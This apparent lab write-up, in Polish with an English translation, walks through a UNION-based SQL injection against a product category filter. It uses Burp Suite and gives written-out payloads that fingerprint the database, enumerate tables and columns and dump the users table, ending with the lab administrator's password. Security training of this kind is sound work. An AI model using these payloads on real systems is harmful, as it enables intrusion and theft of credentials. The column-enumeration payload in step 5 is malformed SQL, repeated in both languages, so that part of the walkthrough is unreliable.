This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user.


1. uruchorm burp suite comunity eddition, włącz intercept on i kliknij w category na stronie zadania, przechwycony wynik prześlij do reapetera i wyłącz intercepta
2. Ustal liczbę kolumn oraz kolumny które zawierają tekst, w reapeterze po category umieszczamy ' UNION select NULL- dodajemy nulle do momentu nie wystąpienia błędu oraz podmieniamy nulle za tekst i patrzymy czy nie wyrzuci nam błędu. Oczywiście wszystko w encoded (ctrl+u)
3. Teraz trzeba ustalić baze danych, po zadaniu wiemy tylko, że nie jest to oracle, dlatego trzeba sprawdzić MySQL/Micorsoft oraz PostgreSQL, więc wpisujemy ' UNION select  @@version, NULL-- (mamy dwie kolumny) oraz ' UNION SELECT version(), NULL--.(ctrl+u) klikamy send i widzimy,że nie dostajemy błędu i w zadaniu jest to wersja PostreSql 
4. Teraz trzeba uzyskać nazwy stołów jakie znajdują się w bazie, by to wykonać skorzystamy z cheat sheet od port swigera: ' UNION SELECT table_name, NULL FROM information_schema.tables--(ctrl+u) send i w response dostajemy nazwy stołów, szukamy nazwy stołu, który zawiera nazwę users. W zadaniu jest to users_xacgsm
5. Teraz należy uzyskać nazwy kolumn. Ponownie korzystamy z cheat sheet i wpisujemy: ' UNION SELECT FROM column_name,NULL WHERE table_name = 'users_xacgsm'-- (ctrl+u) w burpie, klikamy send. Po uzyskaniu 200 ok, szukamy w response kolumy, która nazywa się username oraz password. W tym zadaniu jest to username_pxqwui oraz password_bfvoxs
6. Teraz musimy ustalić loginy i hasła, a więc: ' UNION select username_pxqwui,password_bfvoxs FROM users_xacgsm--(ctrl+u) klikamy send otrzymujemy 200 ok, szukamy loginy administratora i jego hasła. W zadaniu jest to administrator, a hasło to FhdR4*^hGu!@BvfDH7J9




Eng:
1. run burp suite community edition, turn intercept on and click on category on task page, send captured result to repeater and turn off intercept
2. Set the number of columns and the columns that contain the text, in the repeater after category we put ' UNION select NULL - we add nulls until no error occurs and replace nulls with text and see if it will throw us an error. All encoded of course (ctrl+u)
3. Now you need to set the database, the task inform us that it is not oracle, so we need to check MySQL/Micorsoft and PostgreSQL, enter ' UNION select @@version, NULL-- (we have two columns) and ' UNION SELECT version (), NULL--.(ctrl+u) we click send and we see that we do not get an error and in the task it is the PostreSql version
4. Now you need to get the names of the tables that are in the database, to do this we will use the cheat sheet from port swiger: ' UNION SELECT table_name, NULL FROM information_schema.tables--(ctrl+u) send and in response we get table names, we are looking for the name table that contains the name users. In the task it is users_xacgsm
5. Now get the column names. We use the cheat sheet again and enter: ' UNION SELECT FROM column_name,NULL WHERE table_name = 'users_xacgsm'-- (ctrl+u) in burp, click send. After getting 200 ok, we are looking for a column in response, which is called username and password. In this task, it is username_pxqwui and password_bfvoxs
6. Now we need to set logins and passwords, so: ' UNION select username_pxqwui,password_bfvoxs FROM users_xacgsm--(ctrl+u) click send we get 200 ok, we are looking for administrator logins and his password. In the quest it is administrator and the password is FhdR4*^hGu!@BvfDH7J9